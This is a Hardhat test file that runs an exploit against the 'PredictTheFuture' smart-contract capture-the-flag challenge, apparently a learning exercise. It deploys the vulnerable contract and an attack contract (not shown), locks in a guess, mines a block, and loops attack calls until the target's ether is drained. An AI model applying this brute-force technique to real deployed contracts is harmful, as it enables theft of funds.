import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let attackContract: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    // Deploy the PredictTheFuture contract (challenge)
    target = await (
      await ethers.getContractFactory('PredictTheFuture', deployer)
    ).deploy({
      value: utils.parseEther('1'), // Deploy with 1 ether
    });
    await target.deployed();

    // Deploy the PredictTheFutureAttack contract with the address of the target contract
    attackContract = await (
      await ethers.getContractFactory('PredictTheFutureAttack', deployer)
    ).deploy(target.address, {
      value: utils.parseEther('1'), // Deploy with 1 ether
    });
    await attackContract.deployed();
  });

  it('exploit', async () => {
    // Lock in the guess with 1 ether
    await attackContract.connect(attacker).lockInGuess({
      value: utils.parseEther('1'),
    });

    // Capture the logs emitted by the contract for debugging (e.g., Debug messages)
    attackContract.on("Debug", (message: string, value: number) => {
      console.log(`${message}: ${value}`);
    });

    // Mine one additional block so that the next block is bigger than settlement block
    await provider.send('evm_mine', []);


    // Loop until the contract is complete
    while (!(await target.isComplete())) {
      try {
        const attackTx = await attackContract.connect(attacker).attack();
        await attackTx.wait();
      } catch (err) {
        console.log(err);
      }

    }

    // Assert that the challenge contract's balance is now zero (indicating successful exploitation)
    expect(await provider.getBalance(target.address)).to.equal(0);

    // Assert that the challenge is now complete
    expect(await target.isComplete()).to.equal(true);

    // Assert that the attacker received the balance
    const attackerBalance = await provider.getBalance(attacker.address);
    console.log("Attacker balance after exploit:", attackerBalance.toString());
  });
});
